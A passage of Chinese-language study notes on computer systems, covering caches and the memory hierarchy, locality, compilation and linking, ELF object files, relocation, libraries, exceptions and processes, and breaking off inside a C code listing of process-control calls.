<li><p>对于每个被计算的元素必须加载k个值的应用，我们不可能获得低于k的CPE</p>
</li>
<li><p>计算当前加载地址，需要先获取上一轮的地址，由此加载操作之间就存在数据相关，就需要考虑加载延迟了</p>
</li>
</ul>
<p><strong>存储操作对性能的影响</strong></p>
<ul>
<li>存储操作是将寄存器中的数据保存到内存中，所以存储操作不会产生数据相关，但是存储操作会影响加载操作，出现<strong>写/读相关</strong></li>
<li>首先需要先了解加载和存储单元的细节。在存储单元中会有一个<strong>存储缓冲区</strong>，用来保存发射到存储单元但是还未保存到数据高速缓存的存储操作的地址和数据，由此避免存储操作之间的等待。</li>
<li>加载操作会检查存储缓冲区中是否有需要的地址，如果有，则直接将存储缓冲区中的数据作为加载操作的结果。</li>
<li>要在更大范围观察<strong>写/读相关</strong>，不一定存在一个迭代中，可能在相邻迭代中，只要发现<strong>有存储操作，而后执行相同地址的加载操作</strong>，就会有写/读相关，<strong>必须等存储操作进行完成，才能进行加载操作</strong>。</li>
</ul>
<h2 id="存储器层次"><a href="#存储器层次" class="headerlink" title="存储器层次"></a>存储器层次</h2><p><strong>存储器层次的中心思想</strong>，对于每个位于k层的更快、更小的存储设备<strong>作为</strong>位于k+1层的更大、更慢的存储设备的<strong>缓存</strong>。</p>
<p><strong>存储层次为什么有效？</strong>由于<strong>局部性</strong>，相对于层次 k+1 的数据，程序趋向于更<strong>频繁访问层次 k 的数据</strong>。因此，允许层次 k+1 的存取速度更慢，空间更大，单位价格更便宜。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522203909444.png" alt="image-20210522203909444"></p>
<p>这种<strong>存储层次</strong>构建了一个<strong>价格接近最底层存储层次</strong>、<strong>大容量存储</strong>，而<strong>读取数据的速率接近最顶层</strong>的<strong>存储层次</strong>。</p>
<p><strong>读吞吐率 ( 读带宽 )</strong> ：单位时间从<strong>存储器读出字节</strong>的数量 (MB/s)</p>
<p><strong>存储器山：</strong> <strong>读带宽</strong>的时间和<strong>空间局部性</strong>的二维函数</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522225311861.png" alt="image-20210522225311861"></p>
<h2 id="RAM随机访问存储器"><a href="#RAM随机访问存储器" class="headerlink" title="RAM随机访问存储器"></a>RAM随机访问存储器</h2><p>SRAM静态随机访问存储器，一个六晶体管电路实现，更贵更快。</p>
<p>DRAM动态随机访问存储器，一个电容和一个访问晶体管组成，便宜速度慢。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522205457630.png" alt="image-20210522205457630"></p>
<h2 id="高速缓存cache"><a href="#高速缓存cache" class="headerlink" title="高速缓存cache"></a>高速缓存cache</h2><p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522214639517.png" alt="image-20210522214639517"></p>
<p>其中行就是cache块</p>
<p>CPU向cache<strong>请求数据块</strong>，会发生两种情况：</p>
<ul>
<li><p><strong>命中：</strong>我们需要的<strong>数据块存在于高速缓存中</strong>，就命中了。</p>
</li>
<li><p><strong>不命中：</strong>我们需要的<strong>数据块不在cache中</strong>，需要在下一层存储器层次（主存等）中去找，称为不命中。</p>
<ul>
<li><strong>冷不命中：</strong>如果<strong>k层缓存是空的</strong>，则对任何数据的访问都是不命中的。属于<strong>短暂事件</strong>，在缓存暖身后不会出现。</li>
<li><strong>冲突不命中：</strong><ul>
<li><strong>k层缓存</strong>比k +1层缓存空间更小，<strong>只能存放k+1层缓存数据块的子集</strong> 。<br>例如，k+1层的块 i 必须放在 k层 的 (深入理解计算机系统——基础知识/i mod 4) 块中 （严格放置策略），</li>
<li>缓存够大，但是<strong>所需的多个数据块都被映射到同一个缓存块</strong>中，导致一直发生<strong>冲突不命中</strong><br>例如，块0和块8映射到同一个缓存块，反复引用块 0, 8, 0, 8, 0, 8, … 那么每次都会产生冲突</li>
</ul>
</li>
<li><strong>容量不命中：</strong>如果程序执行时，因为<strong>请求的数据块大小超过cache大小</strong>，所需的块不能全部调入Cache 中，则<strong>当某些块被替换后，若又重新被访问，就会发生失效</strong>。这种失效称为<strong>容量失效</strong>。</li>
</ul>
</li>
</ul>
<p><strong>不命中率：</strong>不命中次数所占的百分比。具体计算：</p>
<ul>
<li>在c语言中，数组是以<strong>行优先的方式</strong>去保存在存储器中的。</li>
<li>如果我们按<code>a[0][0]、a[0][1]、......、a[0][n]</code>的顺序去访问或者读取，那么强制不命中率=单个元素字节数/cache数据块大小</li>
<li>如果我们按<code>a[0][0]、a[1][0]、......、a[n][0]</code>的顺序去访问或者读取，那么强制不命中率=100%</li>
<li>若Cache<strong>命中</strong>时间是<strong>1周期</strong>，则其<strong>不命中</strong>处罚时间达到<strong>100周期</strong>，所以<strong>命中率为97%和99%<strong>的</strong>周期数分别是2和4</strong>，差距很大。</li>
</ul>
<p><strong>当把一个数据块调入高一层(靠近CPU)存储器时，可以放在哪些位置上？（映像规则）</strong>，一共有三种：</p>
<ul>
<li><strong>全相联映像</strong>：主存中的任一块可以被放置到Cache中的<strong>任意一个位置</strong>。空间利用率最高，冲突概率最低，实现最复杂。<br><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522214311584.png" alt="image-20210522214311584"><br><strong>全相连Cache：</strong>S=1，只有一组，包括所有的行</li>
<li><strong>直接映射</strong>：主存中的每一块只能被放置到Cache中<strong>唯一的一个位置</strong>。空间利用率最低，冲突概率最高，实现最简单<br><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522214332643.png" alt="image-20210522214332643"><br><strong>直接映射Cache：</strong>E=1，每组有1行</li>
<li><strong>组相连映象：</strong>主存中的每一块可以被放置到Cache中<strong>唯一的一个组中的任何一个位置</strong>。作为两种映像的折中。<br><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522214350625.png" alt="image-20210522214350625"><br><strong>E-路组相连Cache：</strong>E=E，每组有E行</li>
</ul>
<p><strong>当所要访问的块在高一层存储器中时，如何找到该块?（查找算法）</strong><br><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522215621798.png" alt="image-20210522215621798"><br>我们通过一个地址在cache查找数据块，地址组成：标记t、组索引s、偏移量b</p>
<ul>
<li>定位到<strong>组</strong></li>
<li>检查组内任意行是否与<strong>标记</strong>匹配。如果<strong>匹配</strong>且<strong>行</strong>有效（有效位为1），则命中</li>
<li>以<strong>偏移量</strong>定位数据</li>
</ul>
<p><strong>当发生失效时，应替换哪一块？ （替换算法）</strong></p>
<ul>
<li><p><strong>先进先出法(FIFO)：</strong>如果不匹配，新行替换旧行。</p>
</li>
<li><p><strong>随机法：</strong>为了均匀使用组中的各块，这种方法随机地选择被替换的块。</p>
</li>
<li><p><strong>最近最少使用法LRU (Least Recently Used)：</strong>选择近期最少被访问的块作为被替换的块。但由于实现比较困难，现在实际上实现的LRU都只是选择最久没有被访问过的块作为被替换的块。</p>
</li>
</ul>
<p><strong>当进行写访问时，应进行哪些操作（写策略）</strong></p>
<p>写命中：就是cache行有效位为1，反之则不命中</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/20201015223402749.png" alt="img"></p>
<h2 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h2><p>一个编写良好的程序倾向于<strong>引用最近引用过的数据本身</strong>，或者<strong>引用的数据项邻近于其最近引用过的数据项</strong></p>
<ul>
<li><p><strong>时间局部性(Temporal locality)：</strong>最近被引用过的数据很可能很快会被多次引用</p>
</li>
<li><p><strong>空间局部性(Spatial locality)：</strong>一个存储位置被引用了一次，很可能很快其附近存储位置也会被引用。</p>
</li>
</ul>
<p><strong>步长：</strong>按顺序、连续的对 v 的引用，我们称为<strong>步长为1的引用模式。</strong>同理，在一个连续的向量中，每隔k个元素对向量进行访问，称为<strong>步长为k的引用。</strong>一般来说，<strong>随着步长的增加，空间局部性会下降</strong>。</p>
<p><strong>取指令的局部性</strong>：<strong>指令存在于存储器中</strong>，cpu 要读指令就必须取出指令。所以也能评价对于取指令的局部性。在循环中，循环体内的指令多次被执行，所以有<strong>良好的时间和空间局部性</strong>。</p>
<p><strong>对cache友好</strong>的代码要有良好的<strong>局限性</strong>，我们对代码<strong>评价局部性的简单原则</strong>：</p>
<ol>
<li><strong>重复引用同一个变量</strong>有良好的<strong>时间局部性</strong></li>
<li>对于步长为k的引用的程序，<strong>步长越小，空间局部性越好。</strong></li>
<li>对于<strong>取指令</strong>来说、<strong>循环</strong>有较好的时间和空间局部性。</li>
<li>我们需要优化内循环内部的引用（例如：矩阵分块），大部分计算和存储器的访问都在这里。</li>
</ol>
<h2 id="编译系统"><a href="#编译系统" class="headerlink" title="编译系统"></a>编译系统</h2><p>GCC<strong>编译器驱动程序</strong>读取<strong>源程序hello.c</strong>，并把它<strong>翻译</strong>成一个<strong>可执行目标文件hello</strong>。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210527224841457.png" alt="image-20210527224841457"></p>
<ul>
<li><strong>预处理阶段。预处理器（cpp）</strong>根据<strong>字符#开头</strong>的命令，修改原始的c程序。</li>
<li><strong>编译阶段。编译器（ccl）</strong>将<strong>文本文件hello.i</strong>翻译成<strong>文本文件hello.s</strong>，它包含一个<strong>汇编语言程序</strong>。</li>
<li><strong>汇编阶段。</strong>接下来，<strong>汇编器（as）</strong>将<strong>hello.s</strong>翻译成<strong>机器语言指令</strong>，并把这些指令打包成一个叫做<strong>可重定位目标程序的格式</strong>。</li>
<li><strong>链接阶段。</strong>如果，hello程序调用了一个printf函数，它是每个c编译器都会提供的标准C库中的一个函数。<strong>printf函数</strong>存在于一个名为<strong>printf.o</strong>的单独的预编译好了的目标文件中，而这个文件必须<strong>以某种方式合并到我们的hello.o程序</strong>中。<strong>链接器（ld）</strong>就负责处理这种合并。结果就得到hello文件，它是一个<strong>可执行目标文件（简称可执行文件）</strong>，可以<strong>被加载到内存中，由系统执行</strong>。</li>
</ul>
<h2 id="链接和链接器"><a href="#链接和链接器" class="headerlink" title="链接和链接器"></a>链接和链接器</h2><p><strong>链接（linking）</strong>是将<strong>各种代码和数据部分</strong>收集起来并组合成为一个<strong>单一文件</strong>的过程，<strong>这个文件可被加载（或被拷贝）到存储器执行。</strong></p>
<p><strong>链接器（ld）</strong>在软件开发中扮演着一个关键的角色，因为它们使得<strong>分离编译（separate compilation）</strong>成为可能。我们可以将一个大型的应用程序<strong>分解成几个更小的、更好管理的模块</strong>，可以独立地修改和编译这些模块。<strong>当我们改变其中一个模块时，只需要重新编译它</strong>，并重新链接应用，而<strong>不必重新编译其他文件。</strong></p>
<p><strong>链接器做了什么？</strong></p>
<ul>
<li><strong>符号解析。</strong>将每个<strong>符号引用</strong>和刚好和一个<strong>符号定义联系</strong>起来。</li>
<li><strong>重定位。</strong>将<strong>各自的代码和数据合并</strong>到一起。将<strong>可重定位文件</strong>中符号的<strong>相对位置</strong>重定位到<strong>可执行文件</strong>中该符号相应的的<strong>绝对存储位置</strong>。更新所有的<strong>符号引用</strong>到其<strong>绝对位置</strong>。</li>
</ul>
<h2 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h2><p>目标文件三种形式：</p>
<ul>
<li><strong>可重定位目标文件</strong>。包含二进制代码和数据。多个可重定位目标文件合并起来创建一个可执行文件。</li>
<li><strong>可执行目标文件</strong>。包含二进制代码和数据。可被直接拷贝到存储器执行。</li>
<li><strong>共享目标文件</strong>。一种特殊的可重定位目标文件。</li>
</ul>
<p>下图是一种<strong>ELF（Executable and Linkable Format，可执行可链接的格式）可重定位目标文件</strong>格式。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210529120012252.png" alt="image-20210529120012252"></p>
<ul>
<li><strong>ELF头</strong>。<ul>
<li>以一个<strong>十六字节的序列</strong>开始，这个序列描述了<strong>生成该文件的系统的字的大小和字节顺序</strong>。</li>
<li>ELF头剩下的部分包含<strong>帮助链接器语法分析和解释目标文件的信息</strong>。<ul>
<li>ELF头的大小。</li>
<li>目标文件的类型（如可重定位、可执行或者是共享的）</li>
<li>机器类型（IA32）</li>
<li>节头部表的文件偏移</li>
<li>节头部表中的条目大小和数量。</li>
</ul>
</li>
</ul>
</li>
<li>夹在ELF头和节头部表之间的都是<strong>节</strong>。一个典型的ELF可重定位目标文件包含下面几个节：<ul>
<li><strong>.text：</strong>已编译程序的机器代码。</li>
<li><strong>.rodata：</strong>只读数据。比如printf语句中的格式串和switch语句的跳转表。</li>
<li><strong>.data：</strong>已初始化的全局C变量。局部C变量在运行时保存在栈中，链接器不关心它。</li>
<li><strong>.bss：</strong>未初始化的全局C变量。在目标文件中，未初始化变量不需要占据任何实际的磁盘空间，仅仅是为了空间效率的占位符。</li>
<li><strong>.symtab：</strong>一个符号表，它存放在程序中定义和引用的函数和全局变量的信息。</li>
<li><strong>.rel.text：</strong>一个.text节中位置的列表，在与其他可重定位目标文件结合时需要修改这些位置。</li>
<li><strong>.rel.data：</strong>被模块引用或定义的任何全局变量的重定位信息。</li>
<li><strong>.debug：</strong>一个调试符号表。包括局部变量、全局变量以及原始的C源文件。只有用<code>-g</code>选项才会得到这张表。</li>
<li><strong>.line：</strong>原始C源程序中的行号和.text节中机器指令之间的映射。只有用<code>-g</code>选项才会得到这张表。</li>
<li><strong>.strtab：</strong>一个字符串表，其内容包括.symtab和.debug节中的符号表，以及节头部中的节名字。</li>
</ul>
</li>
<li><strong>节头部表</strong>描述不同节的位置和大小，目标文件中每个节都有一个固定大小的<strong>条目（entry）</strong>。</li>
</ul>
<p>下图是一种<strong>ELF（Executable and Linkable Format，可执行可链接的格式）可执行文件</strong>格式。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210601202041685.png" alt="image-20210601202041685"></p>
<ul>
<li><strong>ELF头</strong>，描述文件的总体格式。</li>
<li><strong>段头部表</strong>，将连续的节映射到存储器段。</li>
<li><strong>节</strong>部分，与可重定位目标文件相似，不同之处在于<ul>
<li><strong>.init节</strong>定义了一个函数_init，<strong>程序初始化</strong>会调用它。</li>
<li>因为已经重定位完成，所以不再需要**.rel前缀的节**了</li>
</ul>
</li>
</ul>
<h2 id="链接器符号和符号表"><a href="#链接器符号和符号表" class="headerlink" title="链接器符号和符号表"></a>链接器符号和符号表</h2><p><strong>链接器符号是什么？符号表又是什么？</strong></p>
<ul>
<li><p><strong>链接器符号</strong>其实就是程序中的变量名、函数名。</p>
</li>
<li><p><strong>符号表</strong>是编译器为存储变量名、函数名、对象、类、接口等各种实体的出现情况而创建和维护的一种重要的<strong>数据结构</strong>。</p>
</li>
</ul>
<p><strong>链接器符号分为三种：</strong></p>
<ul>
<li><strong>Global symbols（模块内部定义的全局符号）：</strong>由<strong>本模块定义并能被其他模块引用</strong>。对应于<strong>非静态的的c函数</strong>以及被定义为<strong>不带c语言static属性的全局变量</strong>。</li>
<li><strong>External symbols（外部定义的全局符号）：</strong>由<strong>其他模块定义并被模块引用的全局符号。</strong>对应于<strong>定义在其他模块中的c语言函数和变量</strong>。</li>
<li><strong>Local symbols（本模块的局部符号）：</strong>仅由<strong>本模块定义和引用的本地符号</strong>。对应于<strong>在模块中定义的带static的C语言函数和全局变量</strong>，这些函数和变量<strong>只能在本模块中引用</strong>，不能在其他模块中引用。</li>
<li> <strong>注意：</strong>链接器的局部符号<strong>不是</strong>指程序中的<strong>局部变量</strong>（分配在栈中的临时性变量），链接器不关心这种局部变量。</li>
</ul>
<p><strong>全局符号的强弱：</strong></p>
<ul>
<li>在编译时，<strong>编译器向汇编器输出</strong>的每个<strong>全局符号</strong>，或者是<strong>强符号</strong>，或者是<strong>弱符号</strong>。</li>
<li><strong>强符号</strong>：函数和已初始化的全局变量。</li>
<li><strong>弱符号</strong>：未初始化的全局变量。</li>
<li>对于<strong>多重定义的全局符号</strong>：强符号和弱符号中选强符号，强符号只能有一个，如果没有则选弱符号其中之一。</li>
<li>所以我们在<strong>编程时要注意</strong>尽可能地<strong>避免使用全局变量</strong>，若要使用需要合理使用<strong>static、extern</strong>，记得<strong>变量初始化</strong>。</li>
</ul>
<p><strong>.symtab节的中包含的ELF符号表举例：</strong></p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210529134717830.png" alt="image-20210529134717830"></p>
<h2 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h2><p>在符号解析完成之后，进行<strong>重定位，分为两步</strong>：</p>
<ul>
<li><strong>重定位节和符号定义</strong>。链接器将所有<strong>相同类型的节</strong>合并成同一类型的新的<strong>聚合节</strong>。然后，链接器将<strong>运行时存储器地址</strong>赋给新的<strong>聚合节</strong>。程序的<strong>每个指令和全局变量</strong>都有<strong>唯一的运行时存储器地址</strong>。</li>
<li><strong>重定位节中的符号引用</strong>。链接器依赖<strong>重定位条目</strong>修改代码节和数据节中对每个<strong>符号的引用</strong>，使得它们<strong>指向正确的运行时地址</strong>。</li>
</ul>
<p><strong>重定位条目的格式：</strong></p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210530231721288.png" alt="image-20210530231721288"></p>
<ul>
<li><strong>offset</strong>是需要被修改的<strong>引用的节偏移</strong>。</li>
<li><strong>symbol标识</strong>被修改的<strong>引用应该指向的符号</strong>，就是<strong>符号名</strong>。</li>
<li><strong>type</strong>告知链接器<strong>如何修改新的引用</strong>，也就是<strong>重定位类型</strong>。</li>
</ul>
<p><strong>两种最基本的重定位类型：</strong></p>
<ul>
<li><strong>R_386_PC32：</strong>重定位一个使用32位<strong>PC相对地址</strong>的引用。<strong>PC相对地址</strong>就是距离<strong>程序计数器PC</strong>的<strong>当前运行时值的偏移量</strong>，PC值就是<strong>下一条指令的地址</strong>，PC=PC+value。</li>
<li><strong>R_386_32：</strong>重定位一个使用32位<strong>绝对地址</strong>的引用。</li>
</ul>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210530233504042.png" alt="image-20210530233504042"></p>
<ul>
<li><p>refptr = .text + r.offset，重定位条目r的偏移加上.text节开始的位置，即需要被重定位的32位地址</p>
</li>
<li><p><strong>对于R_386_PC32 类型</strong>，将这32位的值* refptr修改为ADDR(r.symbol)+ *reptr - refaddr(我认为等于reptr)，所以 *reptr 修改为<strong>重定位条目间隔位置与修改位置的相对距离</strong>与<strong>现在位置的值</strong>相加，也就是<strong>4字节地址末尾与重定位条目符号地址的相对距离</strong>。</p>
</li>
<li><p><strong>对于R_386_32类型</strong>，将这32位的值* refptr修改为ADDR(r.symbol)+ *reptr ，所以 *reptr 修改为<strong>引用的绝对位置</strong>与<strong>现在可重定位条目间隔确定的位置的值</strong>相加。</p>
</li>
</ul>
<h2 id="库"><a href="#库" class="headerlink" title="库"></a>库</h2><p><strong>静态库（.a存档文件集）：</strong> <strong>一组</strong>连接起来的<strong>可重定位目标文件</strong>集合，有一个<strong>头部</strong>用来<strong>描述每个成员目标文件的大小和位置。</strong>允许增量更新</p>
<p><strong>使用静态库的链接器行为：</strong>通过在一个或多个<strong>存档</strong>中<strong>查找符号</strong>来<strong>解析外部引用</strong>。若一个存档成员文件<strong>解析了引用</strong>，则可将其<strong>连接到可执行文件</strong>。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210529212040663.png" alt="image-20210529212040663"></p>
<p><strong>使用静态库</strong>时，<strong>链接器</strong>如何<strong>查找符号</strong>并<strong>解析外部引用</strong>？</p>
<ul>
<li><strong>按照命令行的顺序扫描可重定位文件和存档文件集。</strong></li>
<li><strong>在扫描过程中</strong>，维护一个<strong>当前未解析引用</strong>的列表。依据目标文件的符号定义，对遇到的每一个新**.o或.a 文件**, <strong>尝试解析</strong>上述列表中每一个<strong>未解析的引用</strong>。</li>
<li><strong>若在扫描结束时</strong>，未解析列表中<strong>仍有条目存在</strong>，则<strong>报错</strong></li>
<li>所以命令行执行顺序很重要，原则上将<strong>库文件</strong>放在<strong>命令行末尾。</strong></li>
</ul>
<p><strong>静态库的缺点：</strong></p>
<ul>
<li><strong>对系统库进行修复</strong>时，需要对使用到这个库的所有程序进行<strong>重新链接</strong>。</li>
<li>在存储中和运行中的可执行文件都有多个副本。</li>
</ul>
<p><strong>共享库（动态链接库，DLLs， .so 文件）：包含代码和数据的目标文件</strong>，或者<strong>在加载时</strong>，或者<strong>在执行时</strong>，被<strong>动态加载和链接到应用中</strong></p>
<p><strong>使用共享库，加载时的动态链接：</strong>当<strong>创建可执行文件时</strong>，<strong>静态</strong>执行一部分<strong>链接</strong>，然后在<strong>程序加载时</strong>，<strong>动态完成链接</strong>过程。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210529223133606.png" alt="image-20210529223133606"></p>
<ul>
<li>在静态链接时，没有任何数据和代码被拷贝到可执行文件中。反之，链接器拷贝到一些<strong>重定位信息和符号信息</strong>，它们使得<strong>运行时可以解析对共享库中代码和数据的引用</strong>。</li>
<li>在加载时，执行<strong>动态链接</strong>，根据静态链接得到的信息，比如.interp节中的动态链接器的路径名，重定位共享库的<strong>数据和代码</strong>到<strong>存储器段</strong>和重定位可执行文件中所有由共享库定义的<strong>符号的引用</strong>，完成链接任务。</li>
</ul>
<p><strong>使用共享库，运行时的动态链接：</strong>将<strong>动态生成内容</strong>的每个<strong>函数</strong>打包在共享库中。</p>
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p><strong>异常</strong>就是控制流中的突变，用来响应处理器状态中的某些变化。状态变化称为<strong>事件</strong>。</p>
<p>在任何情况下，当处理器检测到有事件发生时，它会通过一张叫<strong>异常表</strong>的跳转表，调用一个专门用来处理这类事件的操作系统子程序。</p>
<p>当异常处理程序<strong>处理完异常之后</strong>，情况有三种：</p>
<ul>
<li>返回，当事件发生时，正在执行的指令</li>
<li>返回，如果没有发生异常，将会执行的下一条指令</li>
<li>终止被中断的程序</li>
</ul>
<p><strong>异常的类别</strong></p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210610170528892.png" alt="image-20210610170528892"></p>
<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>经典定义：进程就是<strong>一个执行中的程序</strong>。也就是说，我们每运行一个程序，都会创建一个新的进程。</p>
<p>我们不关注它如何实现，我们关注它所提供的应用程序的关键抽象：</p>
<ul>
<li>一个独立的<strong>逻辑控制流</strong>。并不是独占处理器，而是多个进程去轮流使用处理器。</li>
<li>一个私立的<strong>地址空间</strong>。并不是独占地使用系统地址空间，而是一个进程给每个程序提供它自己的私有地址空间，理论上不能被其他进程读写。这是由虚拟存储器实现的。</li>
</ul>
<p><strong>并发</strong>是指多个逻辑控制流并发执行，注意与<strong>并行</strong>区别开。</p>
<p><strong>多任务</strong>是指多个进程轮流执行。因为进程的控制流的一部分的时间段叫做<strong>时间片</strong>，所以<strong>多任务</strong>也称为<strong>时间分片</strong>。</p>
<p>内核为<strong>每个进程</strong>维持一个<strong>上下文</strong>。<strong>上下文</strong>就是内核重新启动一个被抢占的进程所需的<strong>状态</strong>，它由<strong>一些对象的值组成</strong>。</p>
<p><strong>操作系统</strong>通过使用<strong>上下文切换</strong>的较高层形式的异常控制流来实现<strong>多任务</strong>，这个过程有三步：</p>
<ol>
<li>保存当前上下文</li>
<li>恢复先前被抢占的进程被保存的上下文</li>
<li>将控制传递给这个新恢复的进程。</li>
</ol>
<p>下图是<strong>进程A和B上下文切换</strong>的一个实例，执行系统调用read到内核，内核中的陷阱程序请求磁盘控制器DMA传输，在传输完成后磁盘中断处理器。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210610193402041.png" alt="image-20210610193402041"></p>
<p>从程序员角度，<strong>进程有三种状态</strong>：</p>
<ol>
<li><strong>运行</strong>。进程正在执行，或者等待被内核调度。</li>
<li><strong>停止</strong>。被挂起，不会被调度。当收到信号时，再次开始运行。</li>
<li><strong>终止</strong>。进程永远停止了。原因主要有：收到的信号的行为是终止进程、从主程序中返回、调用<code>void exit(深入理解计算机系统——基础知识/int status)</code>函数</li>
</ol>
<p><strong>进程控制</strong>，也就是从C程序中操作进程的系统调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unisd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Linux系统中，pit_t被types.h定义为int */</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="keyword">void</span>)</span></span>;          <span class="comment">//返回调用进程的PID(唯一的正数进程ID)</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="keyword">void</span>)</span></span>;          <span class="comment">//返回父进程的PID，父进程指创建调用进程的进程</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************</span></span><br><span class="line"><span class="comment">** 子进程与父进程几乎但不完全相同。它们最大的区别是PID，除此之外相同。</span></span><br><span class="line"><span class="comment">** 所以当父进程调用fork时，子进程可以读写父进程中打开的任何文件 </span></span><br><span class="line"><span class="comment">*************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;            <span class="comment">//父进程通过fork函数创建一个新的运行子进程</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *status, <span 